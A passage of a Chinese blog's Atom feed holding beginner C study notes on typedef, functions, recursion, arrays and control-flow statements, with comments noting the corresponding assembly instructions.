class="line">    <span class="keyword">int</span> b=<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,add);<span class="comment">//3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,<span class="built_in">max</span>(a,b));<span class="comment">//2</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,a+nNum); <span class="comment">//11</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="typedef"><a href="#typedef" class="headerlink" title="typedef"></a>typedef</h3><p>给类型起别名,define宏也能达到类似的效果，但是不能处理指针</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">typedef int df;</span><br><span class="line">df a&#x3D;1;</span><br><span class="line">printf(&quot;%d&quot;,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>; <span class="comment">//函数声明,函数位于main函数之下，必须在上面声明一下</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">11</span>, b = <span class="number">22</span>;</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">0</span>;</span><br><span class="line">c = add(a, b);<span class="comment">//33</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a ,<span class="keyword">int</span> b)</span> </span>&#123;  <span class="comment">//函数定义</span></span><br><span class="line"><span class="keyword">return</span> a + b;<span class="comment">//返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><p>自己嵌套自己</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func1</span><span class="params">(<span class="keyword">int</span> n)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">5</span>;</span><br><span class="line">func1(n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func1</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;  </span><br><span class="line"><span class="keyword">if</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">n--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello the %d world\n"</span>, n);</span><br><span class="line"><span class="keyword">return</span> func1(n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"end"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h3><p>数组的内容必须是同一类型的，通过下标来索引</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,n[<span class="number">4</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n[<span class="number">3</span>][<span class="number">3</span>]=&#123;</span><br><span class="line">        &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">        &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">        &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,n[<span class="number">2</span>][<span class="number">2</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d"</span>.n[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础03–宏-amp-函数-amp-数组&quot;&gt;&lt;a href=&quot;#C语言基础03–宏-amp-函数-amp-数组&quot; class=&quot;headerlink&quot; title=&quot;C语言基础03–宏&amp;amp;函数&amp;amp;数组&quot;&gt;&lt;/a&gt;C语言基础03–宏&amp;amp;函数&amp;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>C语言基础02--条件语句</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8002--%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8002--%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/</id>
    <published>2020-05-15T07:40:50.000Z</published>
    <updated>2020-05-16T16:52:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言基础02–条件语句"><a href="#C语言基础02–条件语句" class="headerlink" title="C语言基础02–条件语句"></a>C语言基础02–条件语句</h1><h3 id="goto语句"><a href="#goto语句" class="headerlink" title="goto语句"></a>goto语句</h3><p>类似于汇编中的JMP,尽量不要用goto，实在没办法再用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">goto</span> loop;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1"</span>);</span><br><span class="line">loop:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="if-else语句"><a href="#if-else语句" class="headerlink" title="if-else语句"></a>if-else语句</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="comment">//条件为true，执行这里</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//反之，执行这里</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//cmp</span></span><br><span class="line">    <span class="comment">//jnz</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n1=<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">switch</span>(n1)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"1"</span>);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"2"</span>);<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"?"</span>);<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//cmp</span></span><br><span class="line">    <span class="comment">//jz</span></span><br><span class="line">    <span class="comment">//cmp</span></span><br><span class="line">    <span class="comment">//jz</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">while</span>(n&gt;<span class="number">1</span>)&#123;<span class="comment">//满足条件就开始循环</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">        n--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// mov</span></span><br><span class="line">    <span class="comment">// cmp</span></span><br><span class="line">    <span class="comment">// call</span></span><br><span class="line">    <span class="comment">// dec</span></span><br><span class="line">    <span class="comment">// jmp</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="do-while语句"><a href="#do-while语句" class="headerlink" title="do-while语句"></a>do-while语句</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;<span class="comment">//先执行一遍</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1"</span>);</span><br><span class="line">        n++;</span><br><span class="line">    &#125;<span class="keyword">while</span>(n&lt;<span class="number">100</span>);<span class="comment">//再判断条件进行循环</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// mov</span></span><br><span class="line"><span class="comment">// &#123;&#125;</span></span><br><span class="line"><span class="comment">// cmp</span></span><br><span class="line"><span class="comment">// jz</span></span><br></pre></td></tr></table></figure><h3 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;<span class="comment">//类似while，但是把定义判断循环整合在一起了，类似于while的简写</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1"</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// mov</span></span><br><span class="line"><span class="comment">// cmp</span></span><br><span class="line"><span class="comment">// jz</span></span><br><span class="line"><span class="comment">// call</span></span><br><span class="line"><span class="comment">// jmp</span></span><br><span class="line"><span class="comment">// inc</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础02–条件语句&quot;&gt;&lt;a href=&quot;#C语言基础02–条件语句&quot; class=&quot;headerlink&quot; title=&quot;C语言基础02–条件语句&quot;&gt;&lt;/a&gt;C语言基础02–条件语句&lt;/h1&gt;&lt;h3 id=&quot;goto语句&quot;&gt;&lt;a href=&quot;#goto语句&quot;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
</feed>
